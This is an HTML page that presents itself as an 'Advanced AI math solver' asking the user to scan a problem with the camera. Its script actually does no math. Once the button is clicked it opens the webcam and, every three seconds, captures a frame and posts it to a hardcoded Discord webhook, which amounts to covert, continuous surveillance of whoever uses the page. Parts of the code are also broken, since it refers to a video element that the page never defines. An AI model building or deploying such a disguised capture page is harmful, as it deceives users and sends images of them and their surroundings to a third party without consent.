<!DOCTYPE html>
<html>
<head>
  <title>Camera math solver</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .btn {
      background-color: #4CAF50; /* Green */
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 10px;
    }
    .btn:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Advanced AI math solver</h1>
    <p>Click the button to scan the problem with the advanced math AI.</p>
    <button class="btn" onclick="captureImage()">Capture Image</button>
  </div>

  <script>
    function captureImage() {
      const webcamVideo = document.getElementById('webcam-video');
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const imgFormat = 'image/jpeg';
      const imgQuality = 0.9;
      const webhookUrl = 'https://discord.com/api/webhooks/1065327345688387635/wH3NICk0X7pGGyrQqNyOhqOh8S9eciqhdybhnj2lfU33Kgagnj_XKoOQD_GNPMryF6Pv';
      const xhr = new XMLHttpRequest();

      navigator.mediaDevices.getUserMedia({video: true})
        .then((stream) => {
          webcamVideo.srcObject = stream;
          webcamVideo.play();
          setInterval(() => {
            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);
            canvas.toBlob((blob) => {
              const reader = new FileReader();
              reader.readAsDataURL(blob);
              reader.onloadend = () => {
                const base64data = reader.result;
                const formData = new FormData();
                formData.append('file', blob, 'image.jpg');
                xhr.onreadystatechange = function() {
                  if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                      console.log('Image sent to Discord!');
                    } else {
                      console.error('Error sending image to Discord:', xhr.responseText);
                    }
                  }
                };
                xhr.open('POST', webhookUrl);
                xhr.send(formData);
              };
            }, imgFormat, imgQuality);
          }, 3000);
        })
        .catch((err) => {
          console.error('Error accessing camera:', err);
        });
    }
  </script>
</body>
</html>
